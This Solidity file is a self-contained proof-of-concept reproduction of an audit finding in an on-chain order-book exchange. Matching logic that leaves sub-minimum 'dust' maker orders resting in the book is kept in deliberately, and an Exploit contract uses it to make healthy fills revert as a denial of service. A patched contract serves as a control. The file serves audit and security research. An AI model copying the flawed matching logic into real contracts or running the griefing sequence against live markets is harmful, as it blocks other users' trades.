// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of GTE CLOB finding 64870 (H-02):
// "Dust orders can block order posting" (Code4rena 2025-07 GTE Spot CLOB & Router).
//
// Real audited source: github.com/code-423n4/2025-07-gte-clob @ commit
// 9f06332ebd4cfe2577d9eae81aeb58d3662ffccd
//   - contracts/clob/CLOB.sol            (_matchIncomingOrder L807-848, _matchIncomingBid,
//                                          ZeroCostTrade guard L439)
//   - contracts/clob/types/Book.sol      (Book/Order/Limit types, getQuoteTokenAmount L471-477,
//                                          add/removeOrderFromBook)
//   - contracts/clob/types/Order.sol     (Order/OrderLib)
//   - contracts/clob/types/TransientMakerData.sol
//
// ROOT CAUSE (verbatim, marked `// @>` below): when an incoming order matches a
// resting maker order, `_matchIncomingOrder` decrements the maker order's amount
// (`makerOrder.amount -= matchData.baseDelta`) with NO check that the remainder
// stays >= `minLimitOrderAmountInBase`. A maker order can therefore be reduced to
// a sub-minimum DUST amount (down to one lot) and left resting at the FRONT of the
// book.
//
// HARM: A later taker whose fill first hits that dust order computes
// `quoteDelta = baseDelta * price / baseSize == 0` (rounds down, see
// getQuoteTokenAmount). Because the dust match yields a non-zero baseDelta but a
// zero quoteDelta, the accumulated `totalQuoteSent` stays 0 and the fill reverts at
// the verbatim guard `if (totalQuoteSent == 0 || totalBaseReceived == 0) revert
// ZeroCostTrade();`. The healthy liquidity resting BEHIND the dust becomes
// unreachable — a permanent liveness DoS / griefing at that price level.
//
// FAITHFULNESS: every function on the exploit path is byte-identical to the audited
// source (see `// VERBATIM` tags). The ONLY reduction is the RedBlackTree price
// index data structure (Book.sol wraps @solady RedBlackTreeLib): it is replaced by
// a semantically-equivalent array-backed index — it is NOT the vulnerable code and
// is never on the honesty-critical path. Token settlement (an external
// AccountManager boundary, out of scope) is omitted; the harm is the pre-settlement
// guard revert.
// ─────────────────────────────────────────────────────────────────────────────

/*//////////////////////////////////////////////////////////////////////////////
                     @solady FixedPointMathLib.min (VERBATIM)
//////////////////////////////////////////////////////////////////////////////*/
library FixedPointMathLib {
    /// @dev Returns the minimum of `x` and `y`.
    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        /// @solidity memory-safe-assembly
        assembly {
            z := xor(x, mul(xor(x, y), lt(y, x)))
        }
    }
}

/*//////////////////////////////////////////////////////////////////////////////
              EventNonce (VERBATIM — contracts/utils/types/EventNonce.sol)
//////////////////////////////////////////////////////////////////////////////*/
struct EventNonceStorage {
    uint256 eventNonce;
}

/// @custom:storage-location erc7201:EventNonceStorage
library EventNonceLib {
    bytes32 constant EVENT_NONCE_STORAGE_POSITION =
        keccak256(abi.encode(uint256(keccak256("EventNonceStorage")) - 1)) & ~bytes32(uint256(0xff));

    function getEventNonceStorage() internal pure returns (EventNonceStorage storage ds) {
        bytes32 position = EVENT_NONCE_STORAGE_POSITION;
        assembly {
            ds.slot := position
        }
    }

    function inc() internal returns (uint256) {
        EventNonceStorage storage ds = getEventNonceStorage();
        return ++ds.eventNonce;
    }
}

/*//////////////////////////////////////////////////////////////////////////////
                    Order (VERBATIM — contracts/clob/types/Order.sol)
//////////////////////////////////////////////////////////////////////////////*/
type OrderId is uint256;

using OrderIdLib for OrderId global;

library OrderIdLib {
    function getOrderId(address account, uint96 id) internal pure returns (uint256) {
        return uint256(bytes32(abi.encodePacked(account, id)));
    }

    function toOrderId(uint256 id) internal pure returns (OrderId) {
        return OrderId.wrap(id);
    }

    function unwrap(OrderId id) internal pure returns (uint256) {
        return uint256(OrderId.unwrap(id));
    }

    function isNull(OrderId id) internal pure returns (bool) {
        return id.unwrap() == NULL_ORDER_ID;
    }
}

uint256 constant NULL_ORDER_ID = 0;
uint32 constant NULL_TIMESTAMP = 0;

enum Side {
    BUY,
    SELL
}

struct Order {
    // SLOT 0 //
    Side side;
    uint32 cancelTimestamp;
    OrderId id;
    OrderId prevOrderId;
    OrderId nextOrderId;
    // SLOT 1 //
    address owner;
    // SLOT 2 //
    uint256 price;
    // SLOT 3 //
    uint256 amount; // denominated in base for limit & either token for fill
}

using OrderLib for Order global;

library OrderLib {
    using OrderIdLib for uint256;

    error OrderNotFound();

    function isExpired(Order memory self) internal view returns (bool) {
        return self.cancelTimestamp != NULL_TIMESTAMP && self.cancelTimestamp < block.timestamp;
    }

    function isNull(Order storage self) internal view returns (bool) {
        return self.id.unwrap() == NULL_ORDER_ID;
    }

    function assertExists(Order storage self) internal view {
        if (self.isNull()) revert OrderNotFound();
    }
}

/*//////////////////////////////////////////////////////////////////////////////
      TransientMakerData (VERBATIM — contracts/clob/types/TransientMakerData.sol)
//////////////////////////////////////////////////////////////////////////////*/
struct MakerCredit {
    address maker;
    uint256 quoteAmount;
    uint256 baseAmount;
}

library TransientMakerData {
    bytes32 constant TRANSIENT_MAKERS_POSITION =
        keccak256(abi.encode(uint256(keccak256("TransientMakers")) - 1)) & ~bytes32(uint256(0xff));
    bytes32 constant TRANSIENT_CREDITS_POSITION =
        keccak256(abi.encode(uint256(keccak256("TransientCredits")) - 1)) & ~bytes32(uint256(0xff));

    error ArithmeticOverflow();

    function addQuoteToken(address maker, uint256 quoteAmount) internal {
        bytes32 slot = keccak256(abi.encode(TRANSIENT_CREDITS_POSITION, maker));
        bytes4 err = ArithmeticOverflow.selector;

        bool exists;
        assembly ("memory-safe") {
            exists := iszero(iszero(tload(slot)))

            if iszero(exists) { tstore(slot, 1) }

            let balSlot := add(slot, 1)

            let oldVal := tload(balSlot)
            let newVal := add(oldVal, quoteAmount)

            if lt(newVal, oldVal) {
                mstore(0x00, err)
                revert(0x00, 0x04)
            }

            tstore(balSlot, newVal)
        }

        if (!exists) _addMaker(maker);
    }

    function addBaseToken(address maker, uint256 baseAmount) internal {
        bytes32 slot = keccak256(abi.encode(TRANSIENT_CREDITS_POSITION, maker));
        bytes4 err = ArithmeticOverflow.selector;

        bool exists;
        assembly ("memory-safe") {
            exists := iszero(iszero(tload(slot)))

            if iszero(exists) { tstore(slot, 1) }

            let balSlot := add(slot, 2)

            let oldVal := tload(balSlot)
            let newVal := add(oldVal, baseAmount)

            if lt(newVal, oldVal) {
                mstore(0x00, err)
                revert(0x00, 0x04)
            }

            tstore(balSlot, newVal)
        }

        if (!exists) _addMaker(maker);
    }

    function _addMaker(address maker) internal {
        bytes32 slot = TRANSIENT_MAKERS_POSITION;

        assembly ("memory-safe") {
            let len := tload(slot)

            mstore(0x00, slot)

            let dataSlot := keccak256(0x00, 0x20)

            tstore(add(dataSlot, len), maker)
            tstore(slot, add(len, 1))
        }
    }
}

/*//////////////////////////////////////////////////////////////////////////////
   RedBlackTree — REDUCED (faithful array-backed price index; NOT vulnerable code).
   The audited Book.sol wraps @solady RedBlackTreeLib. For this single-market PoC we
   replace it with a semantically-equivalent sorted-set over a uint256[] preserving
   the exact return conventions used by Book.sol (minimum()==type(uint256).max when
   empty, maximum()==0 when empty). All Book/CLOB matching logic on top stays verbatim.
//////////////////////////////////////////////////////////////////////////////*/
struct RedBlackTree {
    uint256[] values;
}

using BookRedBlackTreeLib for RedBlackTree global;

library BookRedBlackTreeLib {
    error NodeKeyInvalid();

    function size(RedBlackTree storage tree) internal view returns (uint256) {
        return tree.values.length;
    }

    function contains(RedBlackTree storage tree, uint256 nodeKey) internal view returns (bool) {
        uint256[] storage v = tree.values;
        for (uint256 i; i < v.length; i++) {
            if (v[i] == nodeKey) return true;
        }
        return false;
    }

    /// @dev Returns the minimum value, or type(uint256).max if empty (matches audited wrapper).
    function minimum(RedBlackTree storage tree) internal view returns (uint256) {
        uint256[] storage v = tree.values;
        uint256 len = v.length;
        if (len == 0) return type(uint256).max;
        uint256 m = v[0];
        for (uint256 i = 1; i < len; i++) {
            if (v[i] < m) m = v[i];
        }
        return m;
    }

    /// @dev Returns the maximum value, or 0 if empty (matches audited wrapper).
    function maximum(RedBlackTree storage tree) internal view returns (uint256) {
        uint256[] storage v = tree.values;
        uint256 len = v.length;
        if (len == 0) return 0;
        uint256 m = v[0];
        for (uint256 i = 1; i < len; i++) {
            if (v[i] > m) m = v[i];
        }
        return m;
    }

    function insert(RedBlackTree storage tree, uint256 nodeKey) internal {
        if (contains(tree, nodeKey)) return;
        tree.values.push(nodeKey);
    }

    function remove(RedBlackTree storage tree, uint256 nodeKey) internal {
        uint256[] storage v = tree.values;
        uint256 len = v.length;
        for (uint256 i; i < len; i++) {
            if (v[i] == nodeKey) {
                v[i] = v[len - 1];
                v.pop();
                return;
            }
        }
    }
}

/*//////////////////////////////////////////////////////////////////////////////
             Book types + libraries (VERBATIM — contracts/clob/types/Book.sol)
//////////////////////////////////////////////////////////////////////////////*/
uint256 constant MIN_LIMIT_PRICE_IN_TICKS = 1;
uint256 constant MIN_MIN_LIMIT_ORDER_AMOUNT_BASE = 100;

struct Limit {
    uint64 numOrders;
    OrderId headOrder;
    OrderId tailOrder;
}

struct Book {
    RedBlackTree bidTree;
    RedBlackTree askTree;
    mapping(OrderId => Order) orders;
    mapping(uint256 price => Limit) bidLimits;
    mapping(uint256 price => Limit) askLimits;
}

struct MarketConfig {
    address quoteToken;
    address baseToken;
    uint256 quoteSize;
    uint256 baseSize;
}

struct MarketSettings {
    bool status;
    uint8 maxLimitsPerTx;
    uint256 minLimitOrderAmountInBase;
    uint256 tickSize;
    uint256 lotSizeInBase;
}

struct MarketMetadata {
    uint96 orderIdCounter;
    uint256 numBids;
    uint256 numAsks;
    uint256 baseTokenOpenInterest;
    uint256 quoteTokenOpenInterest;
}

using BookLib for Book global;
using CLOBStorageLib for Book global;

library BookLib {
    using OrderIdLib for uint256;

    event LimitOrderCreated(
        uint256 indexed eventNonce, OrderId indexed orderId, uint256 price, uint256 amount, Side side
    );

    error OrderIdInUse();

    /// @dev Creates and returns a new OrderId nonce
    function incrementOrderId(Book storage self) internal returns (uint256) {
        return OrderIdLib.getOrderId(address(0), ++self.metadata().orderIdCounter);
    }

    /// @dev Adds a limit order to the book
    function addOrderToBook(Book storage self, Order memory order) internal {
        Limit storage limit = _updateBookPostOrder(self, order);

        _updateLimitPostOrder(self, limit, order);
    }

    /// @dev Removes an order from the book
    function removeOrderFromBook(Book storage self, Order storage order) internal {
        _updateLimitRemoveOrder(self, order);
        _updateBookRemoveOrder(self, order);
    }

    function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {
        if (order.side == Side.BUY) {
            limit = self.bidLimits[order.price];
            if (limit.numOrders == 0) self.bidTree.insert(order.price);
            self.metadata().numBids++;
            self.metadata().quoteTokenOpenInterest += self.getQuoteTokenAmount(order.price, order.amount);
        } else {
            limit = self.askLimits[order.price];
            if (limit.numOrders == 0) self.askTree.insert(order.price);
            self.metadata().numAsks++;
            self.metadata().baseTokenOpenInterest += order.amount;
        }

        self.orders[order.id] = order;
    }

    function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {
        limit.numOrders++;

        if (limit.headOrder.isNull()) {
            limit.headOrder = order.id;
            limit.tailOrder = order.id;
        } else {
            Order storage tailOrder = self.orders[limit.tailOrder];
            tailOrder.nextOrderId = order.id;
            order.prevOrderId = tailOrder.id;
            limit.tailOrder = order.id;
        }

        emit LimitOrderCreated(EventNonceLib.inc(), order.id, order.price, order.amount, order.side);
    }

    function _updateBookRemoveOrder(Book storage self, Order storage order) private {
        if (order.side == Side.BUY) {
            self.metadata().numBids--;

            self.metadata().quoteTokenOpenInterest -= self.getQuoteTokenAmount(order.price, order.amount);
        } else {
            self.metadata().numAsks--;

            self.metadata().baseTokenOpenInterest -= order.amount;
        }

        delete self.orders[order.id];
    }

    function _updateLimitRemoveOrder(Book storage self, Order storage order) private {
        uint256 price = order.price;

        Limit storage limit = order.side == Side.BUY ? self.bidLimits[price] : self.askLimits[price];

        if (limit.numOrders == 1) {
            if (order.side == Side.BUY) {
                delete self.bidLimits[price];
                self.bidTree.remove(price);
            } else {
                delete self.askLimits[price];
                self.askTree.remove(price);
            }
            return;
        }

        limit.numOrders--;

        OrderId prev = order.prevOrderId;
        OrderId next = order.nextOrderId;

        if (!prev.isNull()) self.orders[prev].nextOrderId = next;
        else limit.headOrder = next;

        if (!next.isNull()) self.orders[next].prevOrderId = prev;
        else limit.tailOrder = prev;
    }
}

/// @custom:storage-location erc7201:CLOBStorage
library CLOBStorageLib {
    bytes32 constant CLOB_STORAGE_POSITION =
        keccak256(abi.encode(uint256(keccak256("CLOBStorage")) - 1)) & ~bytes32(uint256(0xff));

    bytes32 constant MARKET_CONFIG_STORAGE_POSITION =
        keccak256(abi.encode(uint256(keccak256("MarketConfigStorage")) - 1)) & ~bytes32(uint256(0xff));

    bytes32 constant MARKET_SETTINGS_STORAGE_POSITION =
        keccak256(abi.encode(uint256(keccak256("MarketSettingsStorage")) - 1)) & ~bytes32(uint256(0xff));

    bytes32 constant MARKET_METADATA_STORAGE_POSITION =
        keccak256(abi.encode(uint256(keccak256("MarketMetadataStorage")) - 1)) & ~bytes32(uint256(0xff));

    function settings(Book storage) internal pure returns (MarketSettings storage) {
        return _getMarketSettingsStorage();
    }

    function config(Book storage) internal pure returns (MarketConfig storage) {
        return _getMarketConfigStorage();
    }

    function metadata(Book storage) internal pure returns (MarketMetadata storage) {
        return _getMarketMetadataStorage();
    }

    function _getCLOBStorage() internal pure returns (Book storage self) {
        bytes32 slot = CLOB_STORAGE_POSITION;
        assembly {
            self.slot := slot
        }
    }

    function _getMarketConfigStorage() internal pure returns (MarketConfig storage self) {
        bytes32 slot = MARKET_CONFIG_STORAGE_POSITION;
        assembly {
            self.slot := slot
        }
    }

    function _getMarketSettingsStorage() internal pure returns (MarketSettings storage self) {
        bytes32 slot = MARKET_SETTINGS_STORAGE_POSITION;
        assembly {
            self.slot := slot
        }
    }

    function _getMarketMetadataStorage() internal pure returns (MarketMetadata storage self) {
        bytes32 slot = MARKET_METADATA_STORAGE_POSITION;
        assembly {
            self.slot := slot
        }
    }

    /// @dev Returns the lowest ask price
    function getBestAskPrice(Book storage self) internal view returns (uint256) {
        return self.askTree.minimum();
    }

    /// @dev Returns the base token amount for a given price and quote amount
    function getBaseTokenAmount(Book storage self, uint256 price, uint256 quoteAmount)
        internal
        view
        returns (uint256)
    {
        return quoteAmount * self.config().baseSize / price;
    }

    /// @dev Returns the quote token amount for a given price and base amount
    function getQuoteTokenAmount(Book storage self, uint256 price, uint256 baseAmount)
        internal
        view
        returns (uint256 quoteAmount)
    {
        return baseAmount * price / self.config().baseSize; // @> rounds DOWN: a one-lot dust match yields quoteDelta == 0
    }

    /// @dev Initializes the market config and setting
    function init(Book storage self, MarketConfig memory marketConfig, MarketSettings memory marketSettings) internal {
        MarketConfig storage cs = self.config();
        MarketSettings storage ss = self.settings();

        cs.quoteToken = marketConfig.quoteToken;
        cs.baseToken = marketConfig.baseToken;
        cs.quoteSize = marketConfig.quoteSize;
        cs.baseSize = marketConfig.baseSize;

        ss.status = marketSettings.status;
        ss.maxLimitsPerTx = marketSettings.maxLimitsPerTx;
        ss.minLimitOrderAmountInBase = marketSettings.minLimitOrderAmountInBase;
        ss.tickSize = marketSettings.tickSize;
        ss.lotSizeInBase = marketSettings.lotSizeInBase;
    }
}

/*//////////////////////////////////////////////////////////////////////////////
      VULNERABLE CLOB — matching path VERBATIM (contracts/clob/CLOB.sol).
      Public order-placement + fill entry points are thin faithful wrappers over
      the real add/match primitives; token settlement (external AccountManager) is
      omitted as an out-of-scope boundary — the harm is the pre-settlement guard.
//////////////////////////////////////////////////////////////////////////////*/
contract CLOB {
    using OrderLib for *;
    using OrderIdLib for uint256;
    using FixedPointMathLib for uint256;

    error ZeroCostTrade();

    /// @dev Internal struct to prevent blowing stack (VERBATIM)
    struct __MatchData__ {
        uint256 matchedAmount;
        uint256 baseDelta;
        uint256 quoteDelta;
    }

    function _getStorage() internal pure returns (Book storage) {
        return CLOBStorageLib._getCLOBStorage();
    }

    // ---- setup helpers (faithful use of the real book primitives) ----

    function initMarket(MarketConfig memory c, MarketSettings memory s) external {
        _getStorage().init(c, s);
    }

    /// @dev Places a resting ask (maker) order using the real addOrderToBook primitive.
    function placeAsk(address maker, uint256 price, uint256 amount) external returns (uint256 orderId) {
        Book storage ds = _getStorage();
        orderId = ds.incrementOrderId();

        Order memory o;
        o.side = Side.SELL;
        o.id = orderId.toOrderId();
        o.owner = maker;
        o.price = price;
        o.amount = amount;

        ds.addOrderToBook(o);
    }

    /// @dev Fill (market) BUY, amount denominated in base. Real fill entry: matches
    ///      resting asks then applies the VERBATIM ZeroCostTrade guard.
    function fillBuy(uint256 amount, uint256 priceLimit)
        external
        returns (uint256 totalQuoteSent, uint256 totalBaseReceived)
    {
        Book storage ds = _getStorage();

        Order memory newOrder;
        newOrder.side = Side.BUY;
        newOrder.owner = msg.sender;
        newOrder.amount = amount; // amountIsBase == true
        newOrder.price = priceLimit;

        (totalQuoteSent, totalBaseReceived) = _matchIncomingBid(ds, newOrder, true);

        if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade(); // VERBATIM CLOB.sol L439
        // NOTE: token settlement via AccountManager (external, out of scope) omitted.
    }

    // ---- matching logic (VERBATIM CLOB.sol) ----

    /// @dev Match incoming bid order to best asks (VERBATIM)
    function _matchIncomingBid(Book storage ds, Order memory incomingOrder, bool amountIsBase)
        internal
        returns (uint256 totalQuoteSent, uint256 totalBaseReceived)
    {
        uint256 bestAskPrice = ds.getBestAskPrice();

        while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) {
            Limit storage limit = ds.askLimits[bestAskPrice];
            Order storage bestAskOrder = ds.orders[limit.headOrder];

            if (bestAskOrder.isExpired()) {
                _removeExpiredAsk(ds, bestAskOrder);
                bestAskPrice = ds.getBestAskPrice();
                continue;
            }

            // slither-disable-next-line uninitialized-local
            __MatchData__ memory currMatch =
                _matchIncomingOrder(ds, bestAskOrder, incomingOrder, bestAskPrice, amountIsBase);

            // Break if no tradeable amount can be filled due to lot size constraints.
            // This prevents infinite loops when dust amounts cannot fill a single lot.
            if (currMatch.baseDelta == 0) break;

            incomingOrder.amount -= currMatch.matchedAmount;

            totalQuoteSent += currMatch.quoteDelta;
            totalBaseReceived += currMatch.baseDelta;

            bestAskPrice = ds.getBestAskPrice();
        }
    }

    /// @dev Matches an incoming order to its next counterparty order, crediting the maker and removing the counterparty order if fully filled (VERBATIM)
    function _matchIncomingOrder(
        Book storage ds,
        Order storage makerOrder,
        Order memory takerOrder,
        uint256 matchedPrice,
        bool amountIsBase
    ) internal returns (__MatchData__ memory matchData) {
        uint256 matchedBase = makerOrder.amount;
        uint256 lotSize = ds.settings().lotSizeInBase;

        if (amountIsBase) {
            // denominated in base
            matchData.baseDelta = (matchedBase.min(takerOrder.amount) / lotSize) * lotSize;
            matchData.quoteDelta = ds.getQuoteTokenAmount(matchedPrice, matchData.baseDelta);
            matchData.matchedAmount = matchData.baseDelta;
        } else {
            // denominated in quote
            matchData.baseDelta =
                (matchedBase.min(ds.getBaseTokenAmount(matchedPrice, takerOrder.amount)) / lotSize) * lotSize;
            matchData.quoteDelta = ds.getQuoteTokenAmount(matchedPrice, matchData.baseDelta);
            matchData.matchedAmount = matchData.baseDelta != matchedBase ? takerOrder.amount : matchData.quoteDelta;
        }

        // Early return if no tradeable amount due to lot size constraints (dust)
        if (matchData.baseDelta == 0) return matchData;

        bool orderRemoved = matchData.baseDelta == matchedBase;

        // Handle token accounting for maker.
        if (takerOrder.side == Side.BUY) {
            TransientMakerData.addQuoteToken(makerOrder.owner, matchData.quoteDelta);

            if (!orderRemoved) ds.metadata().baseTokenOpenInterest -= matchData.baseDelta;
        } else {
            TransientMakerData.addBaseToken(makerOrder.owner, matchData.baseDelta);

            if (!orderRemoved) ds.metadata().quoteTokenOpenInterest -= matchData.quoteDelta;
        }

        if (orderRemoved) ds.removeOrderFromBook(makerOrder);
        else makerOrder.amount -= matchData.baseDelta; // @> no min-amount re-check: leaves a sub-minimum DUST order resting at the front of the book
    }

    /// @dev Removes an expired ask, adding the order's amount to settlement data as a base refund (VERBATIM)
    function _removeExpiredAsk(Book storage ds, Order storage order) internal {
        uint256 baseTokenAmount = order.amount;

        // We can add the refund to maker fills because both cancelled asks and filled bids are credited in baseTokens
        TransientMakerData.addBaseToken(order.owner, baseTokenAmount);

        ds.removeOrderFromBook(order);
    }

    // ---- read helpers for the driver / exploit assertions ----

    function askOrderAmount(uint256 price) external view returns (uint256) {
        Book storage ds = _getStorage();
        return ds.orders[ds.askLimits[price].headOrder].amount;
    }

    function minLimitOrderAmountInBase() external view returns (uint256) {
        return _getStorage().settings().minLimitOrderAmountInBase;
    }
}

/*//////////////////////////////////////////////////////////////////////////////
      FIXED CLOB (negative control) — identical to CLOB except `_matchIncomingOrder`
      applies the audit's recommended mitigation: remove a maker order whose amount
      after matching falls below `minLimitOrderAmountInBase`, so no dust can rest.
//////////////////////////////////////////////////////////////////////////////*/
contract CLOBFixed {
    using OrderLib for *;
    using OrderIdLib for uint256;
    using FixedPointMathLib for uint256;

    error ZeroCostTrade();

    struct __MatchData__ {
        uint256 matchedAmount;
        uint256 baseDelta;
        uint256 quoteDelta;
    }

    function _getStorage() internal pure returns (Book storage) {
        return CLOBStorageLib._getCLOBStorage();
    }

    function initMarket(MarketConfig memory c, MarketSettings memory s) external {
        _getStorage().init(c, s);
    }

    function placeAsk(address maker, uint256 price, uint256 amount) external returns (uint256 orderId) {
        Book storage ds = _getStorage();
        orderId = ds.incrementOrderId();

        Order memory o;
        o.side = Side.SELL;
        o.id = orderId.toOrderId();
        o.owner = maker;
        o.price = price;
        o.amount = amount;

        ds.addOrderToBook(o);
    }

    function fillBuy(uint256 amount, uint256 priceLimit)
        external
        returns (uint256 totalQuoteSent, uint256 totalBaseReceived)
    {
        Book storage ds = _getStorage();

        Order memory newOrder;
        newOrder.side = Side.BUY;
        newOrder.owner = msg.sender;
        newOrder.amount = amount;
        newOrder.price = priceLimit;

        (totalQuoteSent, totalBaseReceived) = _matchIncomingBid(ds, newOrder, true);

        if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();
    }

    function _matchIncomingBid(Book storage ds, Order memory incomingOrder, bool amountIsBase)
        internal
        returns (uint256 totalQuoteSent, uint256 totalBaseReceived)
    {
        uint256 bestAskPrice = ds.getBestAskPrice();

        while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) {
            Limit storage limit = ds.askLimits[bestAskPrice];
            Order storage bestAskOrder = ds.orders[limit.headOrder];

            if (bestAskOrder.isExpired()) {
                _removeExpiredAsk(ds, bestAskOrder);
                bestAskPrice = ds.getBestAskPrice();
                continue;
            }

            __MatchData__ memory currMatch =
                _matchIncomingOrder(ds, bestAskOrder, incomingOrder, bestAskPrice, amountIsBase);

            if (currMatch.baseDelta == 0) break;

            incomingOrder.amount -= currMatch.matchedAmount;

            totalQuoteSent += currMatch.quoteDelta;
            totalBaseReceived += currMatch.baseDelta;

            bestAskPrice = ds.getBestAskPrice();
        }
    }

    function _matchIncomingOrder(
        Book storage ds,
        Order storage makerOrder,
        Order memory takerOrder,
        uint256 matchedPrice,
        bool amountIsBase
    ) internal returns (__MatchData__ memory matchData) {
        uint256 matchedBase = makerOrder.amount;
        uint256 lotSize = ds.settings().lotSizeInBase;

        if (amountIsBase) {
            matchData.baseDelta = (matchedBase.min(takerOrder.amount) / lotSize) * lotSize;
            matchData.quoteDelta = ds.getQuoteTokenAmount(matchedPrice, matchData.baseDelta);
            matchData.matchedAmount = matchData.baseDelta;
        } else {
            matchData.baseDelta =
                (matchedBase.min(ds.getBaseTokenAmount(matchedPrice, takerOrder.amount)) / lotSize) * lotSize;
            matchData.quoteDelta = ds.getQuoteTokenAmount(matchedPrice, matchData.baseDelta);
            matchData.matchedAmount = matchData.baseDelta != matchedBase ? takerOrder.amount : matchData.quoteDelta;
        }

        if (matchData.baseDelta == 0) return matchData;

        bool orderRemoved = matchData.baseDelta == matchedBase;

        if (takerOrder.side == Side.BUY) {
            TransientMakerData.addQuoteToken(makerOrder.owner, matchData.quoteDelta);

            if (!orderRemoved) ds.metadata().baseTokenOpenInterest -= matchData.baseDelta;
        } else {
            TransientMakerData.addBaseToken(makerOrder.owner, matchData.baseDelta);

            if (!orderRemoved) ds.metadata().quoteTokenOpenInterest -= matchData.quoteDelta;
        }

        if (orderRemoved) {
            ds.removeOrderFromBook(makerOrder);
        } else {
            makerOrder.amount -= matchData.baseDelta;
            // FIX (recommended mitigation): drop the maker order if the remainder is sub-minimum,
            // so no dust can rest at the front of the book and later revert incoming fills.
            if (makerOrder.amount < ds.settings().minLimitOrderAmountInBase) ds.removeOrderFromBook(makerOrder);
        }
    }

    function _removeExpiredAsk(Book storage ds, Order storage order) internal {
        uint256 baseTokenAmount = order.amount;
        TransientMakerData.addBaseToken(order.owner, baseTokenAmount);
        ds.removeOrderFromBook(order);
    }

    function askOrderAmount(uint256 price) external view returns (uint256) {
        Book storage ds = _getStorage();
        return ds.orders[ds.askLimits[price].headOrder].amount;
    }
}

/*//////////////////////////////////////////////////////////////////////////////
                      Minimal marker token (DoS harm recorder)
//////////////////////////////////////////////////////////////////////////////*/
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/*//////////////////////////////////////////////////////////////////////////////
   Exploit driver (cheatcode-free): create dust, then prove a healthy taker fill
   resting behind the dust reverts with ZeroCostTrade → record 1 BLOCKED-ORDER to
   the SINK. This is a liveness DoS (profit == 0); the SINK marker records the harm.
//////////////////////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant MAKER_A = 0x000000000000000000000000000000000000aaaa;
    address internal constant MAKER_B = 0x000000000000000000000000000000000000BbBB;
    address internal constant TAKER = 0x1111111111111111111111111111111111111111;

    // Market config chosen so a one-lot base match rounds quoteDelta to exactly 0:
    //   quoteDelta = baseDelta * PRICE / BASE_SIZE ; LOT_SIZE * PRICE < BASE_SIZE.
    uint256 internal constant BASE_SIZE = 1e18;
    uint256 internal constant LOT_SIZE = 1e6;
    uint256 internal constant MIN_LIMIT = 1e9; // dust (LOT_SIZE) is far below this
    uint256 internal constant PRICE = 1e11; // LOT_SIZE*PRICE = 1e17 < 1e18 => 1-lot quote rounds to 0
    uint256 internal constant HEALTHY = 1e9; // each resting maker order

    address public vulnAddr;
    address public markerAddr;
    uint256 public dustAmount; // resting maker order amount after being ground to dust
    uint256 public minLimit;
    uint256 public sinkBlockedOrders;
    bool public blockedByZeroCostTrade;

    function _newMarket(address clobLike) internal {
        CLOB(clobLike).initMarket(
            MarketConfig({quoteToken: address(0), baseToken: address(0), quoteSize: BASE_SIZE, baseSize: BASE_SIZE}),
            MarketSettings({
                status: true,
                maxLimitsPerTx: 255,
                minLimitOrderAmountInBase: MIN_LIMIT,
                tickSize: 1,
                lotSizeInBase: LOT_SIZE
            })
        );
    }

    function run() external payable {
        // fixed constructor deploy order (marker LAST)
        CLOB clob = new CLOB(); // nonce 1
        MiniToken marker = new MiniToken("Blocked Order", "BLOCKED-ORDER"); // nonce 2 (LAST)

        vulnAddr = address(clob);
        markerAddr = address(marker);
        minLimit = MIN_LIMIT;

        _newMarket(address(clob));

        // Two resting asks at the same price P: #A (head) and #B (behind it).
        clob.placeAsk(MAKER_A, PRICE, HEALTHY);
        clob.placeAsk(MAKER_B, PRICE, HEALTHY);

        // STEP 1 — grind maker #A down to a one-lot DUST (below MIN_LIMIT) via a
        // legitimate partial fill. quoteDelta here is > 0, so this fill succeeds.
        clob.fillBuy(HEALTHY - LOT_SIZE, PRICE);
        dustAmount = clob.askOrderAmount(PRICE); // == LOT_SIZE (dust), far below MIN_LIMIT

        // STEP 2 — a healthy taker wants LOT-multiple base worth of liquidity that
        // truly exists behind the dust. Its fill first hits the dust (quoteDelta==0),
        // stranding the remainder below the 1-quote-unit rounding floor, so the whole
        // fill reverts with ZeroCostTrade. The taker is denied execution (DoS).
        bool blocked;
        try clob.fillBuy(10 * LOT_SIZE, PRICE) {
            blocked = false;
        } catch (bytes memory reason) {
            blocked = (bytes4(reason) == CLOB.ZeroCostTrade.selector);
        }
        require(blocked, "PoC failed: dust did not block the incoming fill");
        blockedByZeroCostTrade = true;

        // record the harm: one order blocked at this price level
        marker.mint(SINK, 1);
        sinkBlockedOrders = marker.balanceOf(SINK);
    }
}
